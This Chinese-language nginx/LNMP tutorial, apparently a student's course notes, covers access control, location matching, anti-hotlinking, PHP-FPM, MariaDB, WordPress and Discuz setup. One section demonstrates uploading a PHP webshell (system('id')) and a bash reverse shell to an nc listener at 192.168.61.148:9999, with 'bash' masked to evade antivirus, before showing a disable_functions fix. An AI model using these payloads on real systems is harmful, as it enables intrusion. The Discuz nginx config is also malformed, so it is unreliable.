+# 可以看到192.168.61.1，这是我们NAT模式的网卡的网关，也就是说我们的物理机其实是使用的VMnet8虚拟网卡的ip地址进行连接的，如果我们通过防火墙将这个ip地址给封了，那么再建立新的ssh连接应该就连不上这个虚拟机了。
+# firewall-cmd --add-rich-rule='rule family=ipv4 source address="192.168.61.1" drop'
+ # 基于四层的封锁，所有的网站都访问不了、ssh、ftp等等都不行了。
+
+
+# 示例2：看一下nginx的基于七层的访问控制效果
+# systemctl stop firewalld.service  #关闭主机防火墙
+# 拉黑的，叫做加入黑名单，被禁止访问的
+# 加白的，叫做加入白名单，是允许访问的
+# allow 允许
+# deny  拒绝
+
+# 比如我们将a网站做一下访问控制
+[root@web01 conf.d]# pwd
+/etc/nginx/conf.d
+[root@web01 conf.d]# ls
+a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf  www.wulaoban.top.conf
+[root@web01 conf.d]# vim a.jaden.com.conf 
+    server {
+            listen       80;
+            server_name  a.jaden.com;
+            access_log /opt/nginx/a.jaden.com_log jaden;
+            location / {
+            deny 192.168.61.1;  # 黑名单，不允许192.168.61.1访问这个网站
+            allow 0.0.0.0/0;    # 白名单，0.0.0.0/0表示所有ip都在白名单
+            gzip on;                 
+			#...
+            root   /web/one;
+            index  index.html index.htm;
+        }
+    }
+ [root@web01 conf.d]# nginx -t  # 查看语法信息的时候，看到一个warn警告信息，提示有重复的配置，警告没事，我们删除重复的部分即可gzip_types  text/css text/xml application/javascript; #把那个text/html删除
+nginx: [warn] duplicate MIME type "text/html" in 
+/etc/nginx/conf.d/a.jaden.com.conf:13
+nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
+nginx: configuration file /etc/nginx/nginx.conf test is successful
+ 
+ # 重启服务
+[root@web01 conf.d]# systemctl restart nginx.service 
+# 再访问就看到403 forbidden了
+# 黑名单就是先拒绝，再允许所有
+    deny 192.168.61.1;
+    allow 0.0.0.0/0;
+# 白名单就是先允许，再拒绝所有
+    allow 192.168.61.1;   # 白名单
+    allow 192.168.61.16;  # 白名单
+    #allow 192.168.61.16/24;  # 还可以写地址段
+    deny 0.0.0.0/0;    # 黑名单
+
+# 四层禁止(显示无法连接)，哪些情况访问的时候会看到403呢，七层禁止、没有首页html文件、文件没有读取权限，比如nginx访问某些文件，用的nginx用户身份，如果某个网站的文件，nginx用户没有读取权限，那么也是403，我们可以将某个网站的index.html文件权限修改一下看看效果
+
+# 如果某个公司的网站都不想让某个ip地址访问，那么就在四层禁止比较方便。
+```
+
+**防火墙拉黑了某个ip地址的效果：**
+
+![image-20240530204438516](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530204438516.png)
+
+![image-20240530204448111](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530204448111.png)
+
+# 10. nginx location和优先级
+
+nginx网站配置可以配置多个location，单独对某些访问路径进行控制。
+
+比如，将下面这个页面的a目录的访问加一个basic认证
+
+```nginx
+ server {
+        listen       80 default_server;
+        server_name  c.jaden.com;
+        access_log /opt/nginx/c.jaden.com_log jaden;
+        autoindex on;
+        autoindex_exact_size off;
+        location / {
+            root   /web/three;
+            index  index.html index.htm;
+        }
+ 		# 加上如下内容：
+        location /a {
+            auth_basic "b.jaden.com";
+            auth_basic_user_file /etc/nginx/htpasswd; 
+        }
+    }
+```
+
+**访问效果：**
+
+![image-20240530204617931](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530204617931.png)
+
+location还可以配置多个站点根目录
+
+```nginx
+   server {
+        listen       80 default_server;
+        server_name  c.jaden.com;
+        access_log /opt/nginx/c.jaden.com_log jaden;
+        autoindex on;
+        autoindex_exact_size off;
+        location / {
+            root   /web/three;
+            index  index.html index.htm;
+        }
+ 		# 下面配置的意思是，当访问a目录的时候，其实访问的是/web/a/index.html，这就是配置多个站点根目录的意思
+        location /a {
+            root /web;
+        }
+    }
+```
+
+既然可以配置多个站点根目录，那么如果访问的目录冲突了，谁优先呢，刚才看到a目录的访问是下面的 优先了，对吧。优先级还能通过符号来控制，一会我们来看。 
+
+匹配，location的路径支持正则写法，了解几个简单的即可
+
+```nginx
+#没有符号，代表模糊匹配，不支持正则 location /te 可以匹配te开头的目录和文件
+~   #表示执行一个正则匹配，区分大小写
+~*  #表示执行一个正则匹配，不区分大小写
+=   #针对的是文件,精准匹配，不支持正则
+
+    server {
+        listen       80 default_server;
+        server_name  c.jaden.com;
+        access_log /opt/nginx/c.jaden.com_log jaden;
+        autoindex on;
+        autoindex_exact_size off;
+        location / {
+            root   /web/three;
+            index  index.html index.htm;
+        }
+ 		# 下面正则的意思是，只要用户访问txt文件，都返回404状态码。那么就可以做到各类文件的保护，或者各种路径访问的控制
+        location ~* ^.*\.txt$ {
+            return  404;
+        }
+    }
+
+ # 再比如：只要a/A开头的目录，不区分大小写，都不能访问
+location ~* /a+/ {
+ return 405;  # 405是不允许访问的意思的状态码
+}
+ # 再比如：只要a开头的目录，区分大小写，不能访问
+location ~ /a+/ {
+ return 405;  
+}
+ # 再比如：不能访问1.txt文件
+location = /1.txt {
+     return 405;  
+}
+```
+
+匹配符号的优先级
+
+```nginx
+符号优先级 =  大于   ~  大于  ~*  大于  无符号
+
+touch jpg
+ #配置文件符号优先级的例子：
+location ~ /jpg {
+        return 501;
+    }
+    location = /jpg {
+        return 500;
+    }
+    location ~* /Jpg {
+        return 503;
+    }
+    location  /Jpg {
+        return 505;
+    }
+```
+
+```
+ https://www.baidu.com/s?wd=jaden
+```
+
+# 11. nginx常用变量
+
+## 1、常用变量
+
+```nginx
+变量								说明
+
+$args  
+请求中的参数，也叫查询参数，如www.123.com/1.php?a=1&b=2的$args就是a=1&b=2,
+变量说明
+
+
+$content_length 
+HTTP响应信息里的"Content-Length"
+
+$content_type 
+HTTP响应信息里的"Content-Type"，文本文件在浏览上是可以直接预览
+的，就是可以直接打开
+
+$document_root 
+nginx虚拟主机配置文件中的root站点根目录
+
+$document_uri
+当前请求中不包含指令的URI，如www.123.com/1.php?a=1&b=2的$document_uri就是/1.php,不包含后面的参数
+
+$host
+主机头，也就是域名或者ip地址
+
+$http_user_agent
+客户端的详细信息，也就是浏览器的标识，用curl -A可以指定，比如：curl -A 'jaden/666.0' 192.168.61.139
+
+$http_cookie
+客户端的cookie信息
+
+$limit_rate
+如果nginx服务器使用limit_rate配置了显示网络速率，则会显示，如果没有设置， 则显示0
+
+$remote_addr
+客户端的公网ip
+
+$remote_port
+客户端的port
+
+$remote_user
+如果nginx有配置认证，该变量代表客户端认证的用户名
+
+$request_body_fil
+e做反向代理时发给后端服务器的本地资源的名称
+
+$request_method 
+http请求方法，GET/POST/PUT/DELETE等
+
+$request_filename
+当前请求的资源文件的路径名称，相当于是$document_root/$document_uri的组合
+
+$request_uri
+请求的链接，包括$document_uri和$args
+ 
+$scheme
+请求的协议，如ftp,http,https
+
+$server_protocol
+客户端请求资源使用的协议的版本，如HTTP/1.0，HTTP/1.1，HTTP/2.0等
+
+$server_addr
+服务器IP地址
+
+$server_name
+服务器的主机名
+
+$server_port
+服务器的端口号
+
+$uri
+和$document_uri相同
+
+$http_referer
+客户端请求时的referer请求头键值对的值，通俗讲就是该请求是通过哪个链接跳过来的，用curl -e可以指定
+```
+
+## 2、Nginx防盗链
+
+### referer的使用场景
+
+```
+百度搜索--点击某个网站--收费
+盗链：你自己网站视频下载地址，被别人放到他的网站上了，别人从他网站上点击你的下载链接，下载动作和
+流量走的是你的服务器，他收获了人气，你损失了流量。通过referer请求头就可以防盗链。只要下载请求数
+据中的referer值不是你自己网站的网址，那就不让下载。
+```
+
+**比如我们来演示一个防盗链。**
+
+![image-20240530205514960](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530205514960.png)
+
+```nginx
+# 修改b网站的index.html文件：
+root@web01 web]# cd two/
+[root@web01 two]# ls
+ ceshi  games  icon  index  index0  index1  index2  index3  index4  index5 index.html  youxi  youxi.tar.gz
+[root@web01 two]# vim index.html 
+# 添加如下内容：
+<img src='http://a.jaden.com/images/logo.png'>
+```
+
+#####  a网站防盗链
+
+```nginx
+[root@web01 conf.d]# ls
+a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf  www.wulaoban.top.conf
+
+[root@web01 conf.d]# vim a.jaden.com.conf 
+# 加上如下内容
+        location ~* \.png$ {
+ 		if ( $http_referer !~* "a.jaden.com" ) {  #!~* 不包含的意思
+                 return 403;
+             }
+        }
+ # 并且将location中的站点根目录放到全局来
+    server {
+        listen       80;
+        server_name  a.jaden.com;
+        access_log /opt/nginx/a.jaden.com_log jaden;
+		# 站点根目录设置到location外面，表示所有的location的站点根目录都指向/web/one
+        root   /web/one;
+        index  index.html index.htm;
+        location / {
+	#...
+	#root   /web/one;
+	#index  index.html index.htm;
+        }
+        location ~* \.png$ {
+ 		if ( $http_referer !~* "a.jaden.com" ) {
+                 return 403;
+             }
+        }
+    }
+
+```
+
+**重点变量**
+
+```nginx
+host       #http请求头的host域名
+
+referer    #从哪一个url跳转过来的
+
+user_agent #用户的浏览器客户端信息
+
+Connection #是否为长链接
+
+remote_addr #客户端的ip
+
+status     #http的状态码
+```
+
+# 12.nginx 中英文自动匹配
+
+这个示例我们再做一个域名，比如yuyan.com。
+
+```nginx
+# mkdir -p /html/lang/en
+# mkdir -p /html/lang/cn
+# cd /html/lang/en
+# vim index.html  # 写点英文
+# cd /html/lang/cn
+# vim index.html # 写点汉字
+# hosts文件中加入yuyan.com
+
+server {
+   listen 80;
+   server_name yuyan.com; 
+   index index.htm index.html; 
+   charset utf-8;
+   location / {
+		if ( $http_accept_language ~* ^en ) { # 如果accept_language的值以en开头，也就是英文，那么返回英文的站点目录，否则返回中文的站点目录，而且有时候会根据ip地址来返回不同语言的网站。
+   root /html/lang/en;
+ }     
+      root /html/lang/cn;
+  }       
+}
+```
+
+chrome浏览器接受的语言的设置，在这里可以添加：
+
+![image-20240530205913846](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530205913846.png)
+
+查看某个请求的接受语言：
+
+![image-20240530205929593](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530205929593.png)
+
+# 13.nginx+php的动态网站
+
+## 1、静态页面和动态页面
+
+后端开发语言：java\php\python\go\c\c++\ruby...
+
+前端开发语言：html\css\js、nodejs
+
+ 静态页面：任何用户在任何时候任何地点访问这个页面，看到的都是同一个页面，内容完全相同，这种 叫做纯静态页面，也就是没有动态的数据展示。 
+
+动态页面：每次访问这个页面，都可能看到不同的数据，页面效果可能相同，但是展示的数据有变化， 这叫做动态页面，也就是说页面中的数据是服务端那边动态添加的。现在网站大多数都是动态网站。 
+
+纯html文件组成的网站是不能完成动态网站效果的，有同学可能会说，js不是能让页面有动态效果吗？ 注意，动态效果不是动态页面，动态页面是数据会变化，动态效果不算。 
+
+只有Nginx的话，其实只支持静态网站，需要配合上后端开发语言才能支持动态网站。前端客户与服务 端的数据交互是需要后端语言来完成的，这里说的数据交互值得不是网站页面的访问，而是用户在网站 页面上输入一些数据发送给服务端，服务端根据数据的不同做出不同的数据展示，比如百度搜索。 
+
+下面我们通过nginx和php来完成一个动态网站，php大家还没有学，后面会专门学习，先感受一下。
+
+## 2、Nginx+php做动态页面
+
+### 2.1 安装php-fpm
+
+```nginx
+#nginx和php要结合起来的话，需要安装php-fpm
+ yum install php-fpm php-mbstring php-mysqlnd php-gd -y  #php语言很多功能都依赖一些特定的插件，一般我们就叫做模块，这里我们安装一下，关于模块，讲解php的时候会给大家讲。插件的意思就是给某个东西安装一个插件，这个东西就具备了一些额外的能力。
+
+vim /etc/php-fpm.d/www.conf  # 需要调整一些配置
+#修改39行和41行，用户和用户组都改为nginx，不然后面的各种操作会报错，权限问题
+user = nginx
+group = nginx
+
+# 改为之后，执行如下指令
+systemctl start php-fpm.service 
+systemctl enable php-fpm.service
+
+# php-fmp服务启动之后，会开启一个9000端口
+[root@web01 ~]# netstat -lntup
+tcp        0      127.0.0.1:9000    0.0.0.0:*               LISTEN      			1611/php-fpm: maste 
+...
+```
+
+### 3.2 php-fpm的作用流程和Nginx配置
+
+![image-20240530210458191](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530210458191.png)
+
+而nginx想要自动转发给php-fpm，需要给nginx做一些配置：
+
+```nginx
+# 比如我们再创建一个web站点
+[root@web01 ~]# cd /etc/nginx/conf.d/
+
+[root@web01 conf.d]# ls
+a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf  www.wulaoban.top.conf  yuyan.com.conf
+
+[root@web01 conf.d]# vim wulaoban.com.conf
+ #添加上nginx连接php-fpm的配置，直接复制下面这一段就行
+server {
+  listen 80;
+  server_name wulaoban.com;
+  location / {
+    root /html/wulaoban;
+    index index.php index.html index.htm;
+  }
+ # 就是下面这这段配置：大家不需要研究昂，先知道一下即可
+  location ~ \.php$ {
+            root           /html/wulaoban; # 要和上面的站点根目录一致，或者放到全局去配置
+            fastcgi_pass   127.0.0.1:9000;
+            fastcgi_index  index.php;
+            fastcgi_param  SCRIPT_FILENAME  /html/wulaoban$fastcgi_script_name;
+            include        fastcgi_params;
+   }
+}
+
+ # 创建站点根目录：/html/wulaoban
+[root@web01 conf.d]# mkdir /html/wulaoban
+
+# 检查配置：
+[root@web01 conf.d]# nginx -t
+
+# 重启nginx
+[root@web01 conf.d]# systemctl restart nginx
+
+# 我们去下载一个可道云的源代码来作为我们的站点吧：http://kodcloud.com/，下载方式看图
+```
+
+#### 下载可道云
+
+![image-20240530210635054](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530210635054.png)
+
+```nginx
+[root@web01 wulaoban]# cd /html/wulaoban/
+ # 上传过来
+
+[root@web01 wulaoban]# ls
+ kodexplorer4.51.zip
+
+# 解压
+[root@web01 wulaoban]# unzip kodexplorer4.51.zip 
+# 查看nginx和php-fpm的启动用户：
+[root@web01 wulaoban]# ps -ef |grep nginx
+nginx     1612   1611  0 09:51 ? 		00:00:00 php-fpm: pool www
+nginx     1613  1611  0 09:51 ? 		 00:00:00 php-fpm: pool www
+nginx     1614  1611  0 09:51 ?			 00:00:00 php-fpm: pool www
+nginx     1615   1611  0 09:51 ?  		00:00:00 php-fpm: pool www
+nginx     1616  1611  0 09:51 ?  		 00:00:00 php-fpm: pool www
+root      1676    1  0 10:07 ?  		00:00:00 nginx: master process 
+/usr/sbin/nginx
+nginx      1678   1676  0 10:07 ?		00:00:00 nginx: worker process
+root       1697   1488  0 10:15 pts/0    00:00:00 grep --color=auto nginx
+
+# 发现都是nginx用户，但是我们wulaoban目录中的代码文件都是root用户：
+[root@web01 wulaoban]# ll
+总用量 14260
+drwxr-xr-x 10 root root      115 4月  11 12:29 app
+-rw-r--r--  1 root root    9186 4月 11 12:28 changeLog.md
+drwxr-xr-x  3 root root     74 4月  11 12:29 config   
+drwxr-xr-x  7 root root      72 4月  11 12:29 data  
+-rw-r--r--  1 root root      118 4月  11 12:28 index.php
+-rw-r--r--  1 root root    14494333 4月  14 10:10 kodexplorer4.51.zip
+drwxr-xr-x 15 root root      218 4月  11 12:29 plugins
+-rw-r--r--  1 root root      8074 4月  11 12:28 README.MD
+drwxr-xr-x  6 root root        57 4月  11 12:29 static
+
+# 这时候nginx用户是没有权限对这个目录进行上传文件等操作的，所以我们做一下权限修改。
+[root@web01 wulaoban]# chown -R nginx:nginx .  # -R的意思是将当前目录的所有文件、文件夹及其子目录和子文件的用户和用户组都改为nginx。
+
+[root@web01 wulaoban]# ll
+总用量 14260
+drwxr-xr-x 10 nginx nginx      115 4月  11 12:29 app
+-rw-r--r--  1 nginx nginx     91846 4月  11 12:28 ChangeLog.md
+drwxr-xr-x  3 nginx nginx     74 4月  11 12:29 config   
+drwxr-xr-x  7 nginx nginx    72 4月  11 12:29 data   
+-rw-r--r--  1 nginx nginx    118 4月  11 12:28 index.php  
+-rw-r--r--  1 nginx nginx 14494333 4月  14 10:10 kodexplorer4.51.zip
+drwxr-xr-x 15 nginx nginx      218 4月  11 12:29 plugins
+-rw-r--r--  1 nginx nginx     8074 4月  11 12:28 README.MD
+drwxr-xr-x  6 nginx nginx     57 4月  11 12:29 static  
+
+# 然后查看一下我们的网站域名：
+[root@web01 wulaoban]# cat /etc/nginx/conf.d/wulaoban.com.conf 
+server {
+  listen 80;
+  server_name wulaoban.com;  # 这是我们的域名
+  ...
+ }
+
+
+# 修改hosts文件，添加一条记录：
+192.168.61.139  wulaoban.com  # 其他的域名我就先删除了，看着太乱。
+# 接下来就可以打开浏览器访问wulaoban.com域名了
+```
+
+#### 效果如下：
+
+![image-20240530211415228](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530211415228.png)
+
+静态网站其实安全性相比动态网站要高很多，因为不涉及到用户的交互，一旦涉及到用户的交互，有些 用户就耐不住寂寞，总想搞一些恶意的事情。
+
+### 3、漏洞演示
+
+能够看到网站的真实物理路径，那么这个事情就不太好，可以被利用，比如我们创建一个php文件在文 档那个目录吧 
+
+比如文件叫做 jaden.php ，内容如下：
+
+```php
+<?php system("id") ?>  #php 可以执行操作系统指令
+```
+
+在我们的系统上是可以找到这个文件的目录的
+
+```bash
+[root@web01 wulaoban]# find /html -type f -name "jaden.php"
+/html/wulaoban/data/Group/public/home/文档/jaden.php
+
+[root@web01 wulaoban]#
+```
+
+那么我们基于浏览器就能直接访问： wulaoban.com 对应的就是 /html/wulaoban/ 这个真实物理路径：
+
+![image-20240530211703335](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530211703335.png)
+
+```
+这样就看到了它的系统信息，也就是你可以上传一个php文件对它的操作系统进行各种控制。
+
+比如直接拿一下它系统的控制终端，我们专业名字叫做反弹shell。
+
+先在攻击主机上安装一个nv，并开启个nc监
+```
+
+```
+# 安装nc
+yum install nc -y
+
+# 开启nc监听
+nc -lvnp 9999
+```
+
+目标主机上执行：可以将下面的指令放到刚才的php文件中
+
+```
+xxxx -i >& /dev/tcp/192.168.61.148/9999 0>&1  # 这个指令大家先不用管什么意思昂，后面再讲
+
+#xxxx表示bash，以防我们当前的文档被杀软杀掉，一些敏感的指令，我们分开写
+# 攻击机的ip地址：192.168.61.148
+# 攻击机nc监听的端口：9999
+```
+
+访问php文件，看到反弹的shell了：
+
+![image-20240530211927026](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530211927026.png)
+
+关于shell和反弹shell的各种手法及原理，我后面会给大家细致的讲解。关于上面这个示例，我想告诉大 家，其实很多公司都会用一些开源免费的攻击和网站源代码，如果你没有做什么安全防护或者安全配置 调整，那么别人也能拿到这个源码，一分析就知道哪里有漏洞，那么你自己公司就危险了
+
+可以设置禁用 system函数，如下
+
+```bash
+vim /etc/php.ini
+
+# 修改314行：
+	314 disable_functions = system,eval
+
+# 重启php-fpm
+[root@web01 conf.d]# systemctl restart php-fpm.service 
+# 然后再监听，再访问就发现反弹不了了。
+```
+
+# 14.cookie和session
+
+对于他们两个，大家暂时先了解一下即可。
+
+ http协议有一个特点，叫做无状态。 
+
+http 传输数据，不能记住用户的状态 cookie  存储在客户机浏览器  session_id  以及其他信息 
+
+客户端cookie，在请求和响应中可以看到
+
+![image-20240530212038308](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530212038308.png)
+
+![image-20240530212052875](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530212052875.png)
+
+session 存储在服务器 
+
+```bash
+[root@web01 conf.d]# cd /html/wulaoban/data/session/
+[root@web01 session]# ls
+index.html                       sess_5hqvbhq6fqvbmtson44nvqmhe4  
+sess_e4s9ftmsahhp7v9n7cci8g81j4
+sess_3o9n4e45an60e77r1kl2s6gph7  sess_6v3je2a0ntfqoj7u19k365i103  
+sess_eebukpnijqghv3uami4cn9nup6
+
+#只要用户登录成功之后，服务就会自动创建一个session，其实这个网站是访问一下，不管有没有登录成功都会生成session数据
+#我们可以在客户端已经登录了的情况下，把session全部删掉，看一下客户端是否还是登录状态
+[root@web01 session]# rm -rf sess_*
+ root@web01 session]# ls
+ index.html
+
+# 登录一下看效果：
+[root@web01 session]# ll
+总用量 4
+-rwxrwxrwx 1 nginx nginx   0 4月  11 12:29 index.html
+-rwxrwxrwx 1 nginx nginx 395 4月  14 15:08 sess_3o9n4e45an60e77r1kl2s6gph7
+
+[root@web01 session]# cat sess_3o9n4e45an60e77r1kl2s6gph7 
+```
+
+# 15.lnmp网站架构
+
+网站架构指的是一个网站的搭建环境：**操作系统+软件+开发语言**这么三个部分组成。而且很多情况下他 们是常用的相对比较固定的组合。软件主要指的是中间件(主要指的是web服务应用程序)+数据库。 
+
+数据库：mysql\oracle...数据库管理工具，也叫做数据库管理系统，DBMS：database manager  system
+
+```
+linux + nginx + mysql + php   lnmp架构
+
+linux + apache + mysql + php   lamp架构
+
+windows + apache + mysql + php  wamp架构
+
+linux + nginx  + mysql  + tomcat  lnmt架构 ，主要是跑java语言项目的，tomcat本身也是web服务程序，但是本身效率低，可以和nginx结合一起使用
+
+linux + nginx + mysql + uwsgi    lnmu架构，主要是跑python语言项目的
+
+我们先捋清楚lnmp架构，其他的也就都简单了。
+```
+
+# 16.mysql
+
+## 1.安装
+
+```bash
+#mysql以前是一款开源的软件，收费的商业版数据库是oracle，之前互联网发起了去ioe项目，o就是
+oracle，很贵。i是IBM硬件、E是EMC存储设备都很贵，所以好多公司发起了这个行动，这也是大家倾向于开源软件的一个原因。后来mysql发展很好，市场占有量也变的比较大了，国内用的特别多，oracle一看不行，10个亿美元收购了mysql，但是mysql的创始人没闲着，按照mysql的标准又创建了一个数据库软件，mariadb，和mysql的用法是基本一样的，所有的操作指令都是之前mysql的。maria是创始人的孙女。
+
+安装数据库
+yum install mariadb-server mariadb  -y
+systemctl start mariadb
+systemctl enable mariadb
+
+# mariadb启动之后会自动监听3306端口
+[root@web01 ~]# netstat -lntup
+ tcp        0      0 0.0.0.0:3306     0.0.0.0*       1830/mysqld  
+... #可以看到服务还是叫做mysqld
+```
+
+## 2.数据库操作
+
+```mysql
+#登录数据库
+mysql  #输入mysql然后回车，就能在本机直接登录数据了
+[root@web01 ~]# mysql
+Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 2
+Server version: 5.5.68-MariaDB MariaDB Server
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> exit  # exit是退出
+# 如果我们关闭了mariadb服务的话，在输入mysql就会报错
+[root@web01 ~]# systemctl stop mariadb.service 
+[root@web01 ~]# mysql
+ ERROR 2002 (HY000): Can't connect to local MySQL server through socket 
+'/var/lib/mysql/mysql.sock' (2)
+
+
+					#mysql登录进去就可以进行数据库操作了
+#数据库中有三个基本概念
+#库：存数据表的仓库，可以理解为一个网站一个仓库，他实际上对应着硬盘上的一个文件夹，每个库都有自己的名字
+#表：和excel表一样的表现形式来存储数据，二维表，他对应着文件夹中的一个文件，其实一个表需要多个文件来存储数据，每个表都有自己的名字
+#记录：表的第一行叫做表头，也叫做列名，剩下的行都是实际的数据。一行记录是一条数据，多数都会包含一个对象的全部描述信息
+			#举例：比如下面这个表，水果表,fruit：
+id name price number
+ 1  苹果 11.00  20
+ 2  香蕉 15.05  18
+ 3  橘子 8.06   30
+ #查看数据库
+show databases;
+# mysql默认就有四个库
+MariaDB [(none)]> show databases;
+ +--------------------+
+ | Database           |
+ +--------------------+
+ | information_schema |
+ | mysql              |
+ | performance_schema |
+ | test               |
+ +--------------------+
+ 4 rows in set (0.00 sec)
+ 							# 查看当前登录用户
+MariaDB [(none)]> select user();
+ +----------------+
+ | user()         |
+ +----------------+
+ | root@localhost |
+ +----------------+
+ 1 row in set (0.00 sec)
+ sql语句：结构化查询语句，数据库的操作指令
+						#创建数据库
+create database wordpress;
+				#删除数据库，工作中千万不要删除公司的数据库。
+drop database wordpress;
+						 #切换数据库
+use mysql
+ 						#查看表
+show tables;
+ 						#删除表
+drop  table xxxxx;
+ 					#查看所有数据
+select user,host,Password from user;
+
+				#授权，如果没有这个用户，会自动创建，其实创建用户还有几种其他的方式
+#给普通用户授远程连接的权限：
+grant all on wordpress.* to wordpress@'192.168.61.%' identified by '123456';
+#给普通用户授本地登录的权限：默认主机名为localhost，我之前改了主机名叫做web01
+#grant all on wordpress.* to wordpress@主机名 identified by '123456';
+grant all on wordpress.* to wordpress@web01 identified by '123456';
+grant all on wordpress.* to wordpress@localhost identified by '123456';
+#使用普通用户登录
+mysql -u wordpress -p123456 -h 192.168.61.139
+
+#安全初始化mysql，这个先不执行了。
+mysql_secure_installation
+回车，n,一路y
+```
+
+# 17. wordpress
+
+wordpress是一个博客网站，我们来搭建一下，也是php开发的，使用的是mysql数据库。 
+
+前面mysql中我们已经创建了一个叫做wordpress的数据库，而且用户也授权好了，接下来我们搭建一 个wordpress站点。
+
+## 1、增加nginx的站点配置文件
+
+```nginx
+[root@web01 ~]# cd /etc/nginx/conf.d/
+[root@web01 conf.d]# ls
+a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf  wulanban.com.conf  
+www.wulaoban.top.conf  yuyan.com.conf
+
+#因为wordpress也是php开发的网站，我们复制一份wulanban.com.conf改一改就行
+[root@web01 conf.d]# cp wulanban.com.conf wp.jaden.com.conf
+ [root@web01 conf.d]# vim wp.jaden.com.conf
+ server {
+  listen 80;
+  server_name wp.jaden.com;  # 注意不要写wordpress.com，这个和官网地址冲突，改hosts文件可能都不行
+  location / {
+    root /html/wp;
+    index index.php index.html index.htm;
+  }
+ # 就是下面这这段配置：大家不需要研究昂，先知道一下即可
+  location ~ \.php$ {
+            root           /html/wp; # 要和上面的站点根目录一致，或者放到全局去配置
+            fastcgi_pass   127.0.0.1:9000;
+            fastcgi_index  index.php;
+            fastcgi_param  SCRIPT_FILENAME  /html/wp$fastcgi_script_name;
+            include        fastcgi_params;
+   }
+
+
+# 保存之后，检查语法
+nginx -t
+
+# 重启nginx
+systemctl restart nginx.service
+
+# 创建站点根目录
+mkdir /html/wp
+```
+
+##  2、上传wordpress源代码
+
+![image-20240530212804749](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530212804749.png)
+
+**上传到服务器的站点目录下**
+
+```bash
+[root@web01 ~]# cd /html/wp/
+[root@web01 wp]# rz -E
+ rz waiting to receive.
+
+[root@web01 wp]# ls
+ WordPress-4.6.tar.gz
+
+[root@web01 wp]# tar xf WordPress-4.6.tar.gz 
+ 
+[root@web01 wp]# ls
+ WordPress-4.6  WordPress-4.6.tar.gz
+ 
+[root@web01 wp]# mv WordPress-4.6/* .  # 将所有代码放到根目录下
+[root@web01 wp]# ll
+总用量 9764-
+rw-rw-r--  1 root root     418 8月  17 2016 index.php
+-rw-rw-r--  1 root root   19935 8月  17 2016 license.txt
+-rw-rw-r--  1 root root    7342  8月  17 2016 readme.html
+...
+
+# 授权
+[root@web01 wp]# chown -R nginx:nginx .
+[root@web01 wp]# ll
+总用量 9764
+-rw-rw-r--  1 nginx nginx     418 8月  17 2016 index.php 
+-rw-rw-r--  1 nginx nginx    19935 8月  17 2016 license.txt
+-rw-rw-r--  1 nginx nginx     7342 8月  17 2016 readme.html
+...
+
+# 好，接下来就是修改一下hosts文件了
+192.168.61.139  wulaoban.com  wp.jaden.com
+```
+
+###  3、浏览器访问安装，第一访问的时候需要安装，设置个账号密码之类的东西
+
+如下，提示我们做一些数据库的配置
+
+![image-20240530213108155](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213108155.png)
+
+![image-20240530213121481](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213121481.png)
+
+![image-20240530213132833](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213132833.png)
+
+![image-20240530213147028](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213147028.png)
+
+![image-20240530213157601](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213157601.png)
+
+wordpress提供的功能很多，世界上有很多的网站都是用的wordpress模板搭建的，什么wordpress小 说网站、wordpress商城、wordpress视频网站等等，只不过有些自己改了改样式之类的。wordpress 属于cms类的网站，cms是内容管理系统的意思，很多网站都属于cms类型。 
+
+接下来，大家搭建一下这个网站吧。
+
+# 18.discuz论坛
+
+有很多网站也是基于discuz来搭建的，比如IT技术人员经常逛的网站，吾爱破解、网景论坛、恩山论 坛、电子发烧论坛、hifi论坛等等
+
+```
+#1、操作数据库
+create database discuz;
+grant all on discuz.* to discuz@'192.168.61.%' identified  by '123456';
+grant all on discuz.* to discuz@web01 identified by '123456';
+grant all on discuz.* to discuz@localhost identified by '123456';
+```
+
+配置：
+
+```nginx
+#编写nginx配置
+[root@web01 conf.d]# cp wp.jaden.com.conf bbs.jaden.com.conf
+
+[root@web01 conf.d]# vim bbs.jaden.com.conf
+ server {
+  listen 80;
+  server_name bbs.jaden.com;
+  location / {
+    root /html/bbs;
+    index index.php index.html index.htm;
+  }
+    location ~ \.php$ {
+            root           /html/bbs;
+            fastcgi_pass   127.0.0.1:9000;
+            fastcgi_index  index.php;
+   }
+ }
+            fastcgi_param  SCRIPT_FILENAME  /html/bbs$fastcgi_script_name;
+            include        fastcgi_params;
+ 
+
+nginx -t
+
+systemctl  restart nginx
+```
+
+![image-20240530213330446](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530213330446.png)
+
+准备：
+
+```bash
+#准备代码文件
+mkdir  /html/bbs
